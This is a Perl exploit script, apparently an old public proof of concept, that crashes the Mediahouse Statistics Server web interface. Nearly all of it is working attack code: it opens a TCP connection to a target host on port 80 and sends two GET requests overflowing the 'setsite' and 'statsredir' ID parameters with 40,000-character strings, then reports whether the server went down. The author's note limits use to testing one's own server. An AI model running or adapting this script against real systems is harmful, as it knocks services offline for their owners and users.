#!/usr/bin/perl

###############################################################
# Sample DoS against the Mediahouse Statistics Server
# This was tested against 4.28 & 5.01 running on Windows NT 4.0
#
# Only use it to determine if your own Server is vulnerable!
#
# Per Bergehed (per_bergehed@hotmail.com)
#
# http://w1.855.telia.com/~u85513179/security/exploits/mediahouse.html
#
# V1.0 - Check for "ss?form=statsredir&ID=..." buffer overflow.
# V1.1 - added check for "ss?form=setsite&ID=..." buffer overflow.
#

use IO::Socket;

print "############################################################\n";
print "# Simple DoS-attack against the Mediahouse Statistics Server\n";
print "# Tested with version 4.28 & 5.01\n";
print "\n";

if ($#ARGV != 0) 
{
        die "-> Please give the host address as argument.\n"
}

opensocket ("\n");
print $remote "GET " . "ss?setsite=" . "A" x 40000 . "& HTTP/1.0\n\n";
print $remote "GET " . "ss?form=statsredir&ID=" . "A" x 40000 . "& HTTP/1.0\n\n";
close $remote;

opensocket ("\n-> The server seemed to be vulnerable to this attack\n");
close $remote;
die "-> The server does not seem to be vulnerable to this attack\n";

sub opensocket 
{
        $remote = IO::Socket::INET->new (
                Proto => "tcp",
                PeerAddr => $ARGV[0],
                PeerPort => "http(80)",
        ) || die "# Can't open http-port on $ARGV[0]$_[0]";
        $remote->autoflush(1)
}

# EOF